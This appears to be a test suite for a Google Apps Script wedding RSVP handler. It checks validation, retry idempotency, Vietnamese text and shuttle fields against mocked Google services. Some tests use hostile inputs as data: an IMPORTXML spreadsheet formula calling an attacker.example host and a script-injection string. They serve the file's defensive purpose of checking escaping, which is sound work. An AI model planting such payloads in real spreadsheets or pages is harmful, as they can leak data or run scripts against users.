import { beforeEach, describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { runInNewContext } from "node:vm";

const script = readFileSync(new URL("../../apps-script/Code.gs", import.meta.url), "utf8");
const origin = "https://invitation.example";
const nonce = "3cdbd701-b730-4963-a468-40e7bddfc32e";
const valid = {
  requestId: "d0da906d-8fb7-4c37-8f51-dd5bcb5aa770",
  name: " Nguyễn An ", attendance: "attending", count: 2,
  note: " Hẹn gặp hai bạn! ", website: "",
};
interface Receipt {
  type: string;
  nonce: string;
  ok: boolean;
  requestId?: string;
  error?: string;
}

// Run the deployable script and its HTML receipt, mocking only Google services.
function googleHarness() {
  const rows: unknown[][] = [];
  let locked = false;
  let busy = false;
  let failFlush = false;
  const lock = {
    tryLock() { locked = !busy; return locked; },
    hasLock() { return locked; },
    releaseLock() { locked = false; },
  };
  function range(row: number, column: number, height = 1, width = 1) {
    expect(locked).toBe(true);
    return {
      setValues(values: unknown[][]) {
        values.forEach((cells, i) => {
          rows[row - 1 + i] ??= [];
          cells.forEach((value, j) => { rows[row - 1 + i]![column - 1 + j] = value; });
        });
      },
      getValues() {
        return Array.from({ length: height }, (_, i) =>
          Array.from({ length: width }, (_, j) => rows[row - 1 + i]?.[column - 1 + j] ?? ""));
      },
      getValue() { return rows[row - 1]?.[column - 1] ?? ""; },
      createTextFinder(text: string) {
        const finder = {
          matchEntireCell() { return finder; },
          matchCase() { return finder; },
          useRegularExpression() { return finder; },
          findNext() {
            const index = rows.findIndex((cells, i) => i >= row - 1 && i < row - 1 + height && cells[column - 1] === text);
            return index < 0 ? null : { getRow: () => index + 1 };
          },
        };
        return finder;
      },
    };
  }
  const sheet = {
    getLastRow: () => rows.length,
    getRange: range,
    appendRow(values: unknown[]) { expect(locked).toBe(true); rows.push(values); },
  };
  let exists = false;
  const runtime = runInNewContext(script + "\n({ doPost })", {
    LockService: { getScriptLock: () => lock },
    SpreadsheetApp: {
      openById(id: string) {
        expect(id).toBe("1c7TpzxU7pS5JtdgGbt_1cFwR336KVPWPQqdzLD1ARc0");
        return {
          getSheetByName: () => exists ? sheet : null,
          insertSheet(name: string) { expect(name).toBe("RSVP"); exists = true; return sheet; },
        };
      },
      flush() { if (failFlush) throw new Error("private account failure"); },
    },
    HtmlService: {
      XFrameOptionsMode: { ALLOWALL: "ALLOWALL" },
      createHtmlOutput: (body: string) => ({
        getContent: () => body,
        setXFrameOptionsMode(mode: string) { expect(mode).toBe("ALLOWALL"); return this; },
      }),
    },
  }) as { doPost(event: { parameter: Record<string, string> }): { getContent(): string } };
  return {
    rows,
    get locked() { return locked; },
    set busy(value: boolean) { busy = value; },
    set failFlush(value: boolean) { failFlush = value; },
    html(payload: unknown, fields: Record<string, string> = {}) {
      return runtime.doPost({ parameter: {
        payload: typeof payload === "string" ? payload : JSON.stringify(payload),
        nonce, origin, ...fields,
      } }).getContent();
    },
    post(payload: unknown = valid): Receipt {
      const html = this.html(payload);
      let receipt: Receipt | undefined;
      runInNewContext(html.replace(/^<script>|<\/script>$/g, ""), {
        window: { top: { postMessage(value: Receipt, target: string) {
          expect(target).toBe(origin);
          receipt = value;
        } } },
      });
      if (!receipt) throw new Error("Missing acknowledgement");
      return receipt;
    },
  };
}

describe("Direct RSVP → Google Apps Script", () => {
  let google: ReturnType<typeof googleHarness>;
  beforeEach(() => { google = googleHarness(); });

  test("saves Unicode data without a token and returns only a matching receipt", () => {
    expect(google.post()).toEqual({
      type: "wedding-rsvp", nonce, ok: true, requestId: valid.requestId, version: 2,
    });
    expect(google.rows[1]?.slice(2, 6)).toEqual(["Nguyễn An", "attending", 2, "Hẹn gặp hai bạn!"]);
    expect(google.rows[0]?.slice(7, 13)).toEqual(["Xe đưa đón", "Chiều đi", "Tên xe", "Trạm đón", "Chiều về", "Trạm trả"]);
    expect(google.rows[1]?.slice(7, 13)).toEqual(["", "", "", "", "", ""]);
    expect(google.locked).toBe(false);
  });

  test("retries after a lost receipt reuse the row; changed data cannot overwrite it", () => {
    google.html(valid); // Saved, but the browser never received this receipt.
    for (let i = 0; i < 3; i++) expect(google.post().ok).toBe(true);
    expect(google.post({ ...valid, requestId: valid.requestId.toUpperCase() }).ok).toBe(true);
    expect(google.post({ ...valid, count: 3 }).error).toBe("idempotency_conflict");
    expect(google.rows).toHaveLength(2);
    expect(google.rows[1]?.[4]).toBe(2);
  });

  test("accepts absent/default fields and maximum lengths", () => {
    expect(google.post({ ...valid, attendance: "absent", count: 10, name: "n".repeat(80), note: "x".repeat(400) }).ok).toBe(true);
    expect(google.post({ ...valid, requestId: crypto.randomUUID(), note: undefined, website: undefined }).ok).toBe(true);
  });

  test("escapes spreadsheet formulas and never includes guest HTML in the receipt", () => {
    const body = { ...valid, name: '=IMPORTXML("https://attacker.example", "//a")', note: "</script><script>alert(1)</script>" };
    expect(google.post(body).ok).toBe(true);
    expect(google.html(body)).not.toContain(body.note);
    expect(google.rows[1]?.[2]).toBe("'" + body.name);
    expect(google.rows[1]?.[5]).toBe(body.note);
    expect(google.post({ ...valid, requestId: crypto.randomUUID(), note: "+formula" }).ok).toBe(true);
    expect(google.rows[2]?.[5]).toBe("'+formula");
  });

  test.each([
    { requestId: "invalid" }, { name: " " }, { name: 1 }, { name: "n".repeat(81) },
    { note: "n".repeat(401) }, { attendance: "yes" }, { count: 0 }, { count: 11 },
    { count: 1.5 }, { count: "2" }, { website: "spam" }, { website: 123 },
  ])("rejects invalid submissions before opening the spreadsheet: %j", (fields) => {
    expect(google.post({ ...valid, ...fields }).error).toBe("invalid_request");
    expect(google.rows).toHaveLength(0);
  });

  test("rejects malformed/oversized payloads and unsafe receipt parameters", () => {
    for (const payload of ["{broken", "null", "[]", "true", "x".repeat(16385)]) {
      expect(google.post(payload).ok).toBe(false);
    }
    for (const fields of [{ nonce: "invalid" }, { origin: "*" }, { origin: 'https://site.example/</script>' }]) {
      expect(google.html(valid, fields)).toBe("Invalid request");
    }
    expect(google.rows).toHaveLength(0);
  });

  test("saves pickup and drop-off names as text, without a station id list", () => {
    const body = {
      ...valid,
      requestId: crypto.randomUUID(),
      transport: "shuttle",
      outbound: "trip-1",
      station: " Công viên 30/4, Quận 1 ",
      vehicle: " Xe 16 chỗ ",
      returnRide: "same",
      returnStation: "Bến xe Miền Đông mới",
    };
    expect(google.post(body)).toMatchObject({ ok: true, version: 2, requestId: body.requestId });
    expect(google.rows[1]?.slice(7, 13)).toEqual([
      "Dùng xe", "Chuyến 1", "Xe 16 chỗ", "Công viên 30/4, Quận 1", "Xe cũ", "Bến xe Miền Đông mới",
    ]);
    expect(JSON.parse(String(google.rows[1]?.[6]))).toMatchObject({
      vehicle: "Xe 16 chỗ", station: "Công viên 30/4, Quận 1", returnStation: "Bến xe Miền Đông mới",
    });
    const renamed = {
      ...valid, requestId: crypto.randomUUID(), transport: "shuttle", outbound: "trip-2",
      vehicle: "Xe Innova", station: "Ngã tư Thủ Đức", returnRide: "self",
    };
    expect(google.post(renamed).ok).toBe(true);
    expect(google.rows[2]?.slice(7, 13)).toEqual(["Dùng xe", "Chuyến 2", "Xe Innova", "Ngã tư Thủ Đức", "Tự về", ""]);
    expect(google.post({
      ...valid, requestId: crypto.randomUUID(), transport: "shuttle", outbound: "self", returnRide: "self",
    }).ok).toBe(true);
    expect(google.rows[3]?.slice(7, 13)).toEqual(["Dùng xe", "Tự đi", "", "", "Tự về", ""]);
    expect(google.post({
      ...valid, requestId: crypto.randomUUID(), transport: "own",
    }).ok).toBe(true);
    expect(google.rows[4]?.slice(7, 13)).toEqual(["Tự sắp xếp", "", "", "", "", ""]);
    const formula = { ...body, requestId: crypto.randomUUID(), station: "=IMPORTXML(\"https://attacker.example\",\"//a\")" };
    expect(google.post(formula).ok).toBe(true);
    expect(google.rows[5]?.[10]).toBe("'" + formula.station);
  });

  test("extends an old RSVP header with the shuttle text columns", () => {
    google.post();
    google.rows[0] = google.rows[0]!.slice(0, 7);
    const next = { ...valid, requestId: crypto.randomUUID(), transport: "own" as const };
    expect(google.post(next).ok).toBe(true);
    expect(google.rows[0]?.slice(7, 13)).toEqual(["Xe đưa đón", "Chiều đi", "Tên xe", "Trạm đón", "Chiều về", "Trạm trả"]);
    google.rows[0]![7] = "Sai";
    expect(google.post({ ...next, requestId: crypto.randomUUID() }).error).toBe("service_unavailable");
    expect(google.rows).toHaveLength(3);
  });

  test.each([
    { attendance: "absent", transport: "shuttle", outbound: "trip-1", station: "Miền Đông", returnRide: "same", returnStation: "Miền Đông" },
    { transport: "taxi" },
    { transport: "own", outbound: "self" },
    { transport: "shuttle" },
    { transport: "shuttle", outbound: "trip-2", returnRide: "same", returnStation: "Suối Tiên" },
    { transport: "shuttle", outbound: "trip-2", station: " ", returnRide: "self" },
    { transport: "shuttle", outbound: "trip-2", station: "x".repeat(121), returnRide: "self" },
    { transport: "shuttle", outbound: "self", station: "Hàng Xanh", returnRide: "self" },
    { transport: "shuttle", outbound: "none", returnRide: "same", returnStation: "Hàng Xanh" },
    { transport: "shuttle", outbound: "trip-1", station: "Suối Tiên", returnRide: "bus" },
    { transport: "shuttle", outbound: "self", vehicle: "Xe 1", returnRide: "self" },
    { transport: "shuttle", outbound: "trip-1", vehicle: " ", station: "Suối Tiên", returnRide: "self" },
  ])("rejects a malformed shuttle answer before writing: %j", (fields) => {
    expect(google.post({ ...valid, requestId: crypto.randomUUID(), ...fields }).error).toBe("invalid_request");
    expect(google.rows).toHaveLength(0);
  });

  test("lock contention, flush failure and unexpected headers cannot acknowledge success", () => {
    google.busy = true;
    expect(google.post().error).toBe("service_unavailable");
    expect(google.rows).toHaveLength(0);
    google.busy = false;
    google.failFlush = true;
    expect(google.post().error).toBe("service_unavailable");
    expect(google.locked).toBe(false);
    google.failFlush = false;
    expect(google.post().ok).toBe(true);
    google.rows[0]![0] = "User's existing unrelated data";
    expect(google.post({ ...valid, requestId: crypto.randomUUID() }).error).toBe("service_unavailable");
    expect(google.rows).toHaveLength(2);
  });
});
